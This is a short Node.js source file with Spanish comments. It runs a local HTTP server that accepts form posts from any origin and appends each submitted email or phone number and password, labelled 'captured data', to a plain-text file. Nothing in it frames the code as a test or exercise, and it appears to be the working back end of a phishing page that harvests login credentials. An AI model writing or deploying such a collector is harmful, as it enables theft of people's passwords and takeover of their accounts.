const fs = require("fs");
const http = require("http");
const url = require("url");
const querystring = require("querystring");

// Función para guardar datos en el archivo
function guardarDatos(email, password) {
  const fecha = new Date();
  const fechaFormateada = fecha.toLocaleString("es-ES");

  const datos =
    `=== DATOS CAPTURADOS ===\n` +
    `Fecha: ${fechaFormateada}\n` +
    `Email/Teléfono: ${email}\n` +
    `Contraseña: ${password}\n` +
    `========================\n\n`;

  // Crear el archivo si no existe o agregar datos si ya existe
  fs.appendFile("datos.txt", datos, "utf8", (err) => {
    if (err) {
      console.error("Error al escribir en el archivo:", err);
      return;
    }
    console.log("Datos guardados exitosamente en datos.txt");
  });
}

// Crear servidor HTTP para recibir los datos del formulario
const server = http.createServer((req, res) => {
  // Configurar CORS para permitir peticiones desde el navegador
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === "POST" && req.url === "/guardar-datos") {
    let body = "";

    req.on("data", (chunk) => {
      body += chunk.toString();
    });

    req.on("end", () => {
      try {
        const datos = JSON.parse(body);
        guardarDatos(datos.email, datos.password);

        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            success: true,
            message: "Datos guardados correctamente",
          })
        );
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            success: false,
            message: "Error al procesar los datos",
          })
        );
      }
    });
  } else {
    res.writeHead(404, { "Content-Type": "text/plain" });
    res.end("Endpoint no encontrado");
  }
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`Servidor ejecutándose en http://localhost:${PORT}`);
  console.log("Esperando datos del formulario...");
});
